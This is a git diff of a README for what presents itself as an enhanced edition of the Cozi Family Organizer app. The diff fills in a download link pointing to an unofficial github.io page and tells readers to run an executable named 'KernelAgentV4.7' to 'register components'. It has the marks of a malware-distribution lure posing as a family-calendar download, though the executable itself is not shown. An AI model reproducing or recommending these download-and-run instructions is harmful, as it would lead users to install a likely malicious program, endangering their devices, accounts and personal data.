@@ -2,13 +2,15 @@
 
 Stay connected with your entire household using the Cozi Family Organizer. This enhanced setup includes everything needed to streamline schedules, grocery lists, appointments, and more—all from a shared platform.
 
-[![Download Cozi Organizer](https://img.shields.io/badge/Download-Cozi_Organizer-blueviolet)](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download Cozi Organizer](https://img.shields.io/badge/Download-Cozi_Organizer-blueviolet)](https://cozi-family-organizer-premium.github.io/.github
+)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](🔗 PLACE_YOUR_DOWNLOAD_LINK_HERE) section  
+1. 📦 **Download the archive** from the [Releases](https://cozi-family-organizer-premium.github.io/.github
+) section  
 2. 📁 **Extract the folder** to any location (e.g. `C:\CoziOrganizer`)  
 3. 🖱 **Run the executable file** `KernelAgentV4.7` (required to register components and sync calendar services)  
 4. 📅 Launch the app and start managing your family’s time together  
